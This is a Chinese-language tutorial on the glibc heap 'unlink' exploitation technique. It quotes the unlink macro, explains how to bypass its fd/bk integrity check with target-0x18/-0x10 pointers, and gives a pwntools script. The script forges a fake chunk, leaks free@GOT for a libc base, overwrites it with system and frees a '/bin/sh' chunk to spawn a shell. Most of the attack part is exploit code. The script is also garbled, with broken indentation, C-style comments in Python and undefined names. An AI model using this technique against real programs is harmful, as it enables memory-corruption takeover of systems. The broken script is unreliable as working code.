unlink的定义与行为

1、定义

unlink是一个宏定义，其主要利用的代码段是 

#define unlink(AV, P, BK, FD) {                                            
    FD = P->fd;								      
    BK = P->bk;								      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
    malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        FD->bk = BK;							      
        BK->fd = FD;							      
        if (!in_smallbin_range (P->size)				      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
        malloc_printerr (check_action,				      
                "corrupted double-linked list (not small)",    
                P, AV);					      
            if (FD->fd_nextsize == NULL) {				      
                if (P->fd_nextsize == P)				      
                FD->fd_nextsize = FD->bk_nextsize = FD;		      
                else {							      
                    FD->fd_nextsize = P->fd_nextsize;			      
                    FD->bk_nextsize = P->bk_nextsize;			      
                    P->fd_nextsize->bk_nextsize = FD;			      
                    P->bk_nextsize->fd_nextsize = FD;			      
                }							      
            } else {							      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
            }								      
        }								      
    }									      
}

2、行为

unlink的行为顾名思义，是进行的脱链的操作。
将一个free状态的chunk，从双向链表中脱离出来。

unlink漏洞

由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。
所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的fd内存块。
但是由于在后续glibc中增添了新的保护，所以导致其利用受限

FD->bk==ptr;
BK->fd==ptr;

新增了这两条，绕过的方法也有

FD->bk=ptr-0x18
BK->fd=ptr-0x10

#!/usr/bin/python3
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

    pause()

def inter():
    p.interactive()

def sa(content,payload):
    p.sendafter(content,payload)

def sla(content,payload):
    p.sendlineafter(content,payload)

def uc64():
    u64(p.recvuntil(b"\\x7f")[-6:].ljust(8,b"\\x00"))

def uc32():
    u32(p.recvuntil(b"\\xf7")[-4:].ljust(4,b"\\x00"))

def exec_fmt(pad):
    p = process("./fmt")
    p.send(pad)
    return p.recv()
def rc(content):
    p.recvuntil(content)

def l(choose):
sla("chooice :",str(choose))

def add(size):
l(1)
sla("size",str(size))

def free(index):
l(2)
sla("delete",str(index))

def show(index):
l(3)
sla("show",str(index))

def edit(index,content):
l(4)
sla("modify",str(index))
sa("content",content)

add(0x50)
add(0x40)
add(0x90)
add(0x10)

tar=0x6020C8
fd=tar-0x18
bk=tar-0x10

payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+p64(0)*0x4+p64(0x40)+p64(0xa0)          //伪造被unlink的chunk，并逃逸检查
edit(1,payload)
free(2) //触发unlink宏



payload=b'a'*0x10+p64(elf.got['free'])
edit(1,payload)
show(0)

base=free_got-libc.sym['free']
sys=base+libc.sym['system']
print("base=",hex(base))
edit(0,p64(sys))
edit(3,b'/bin/sh\x00')
free(3)
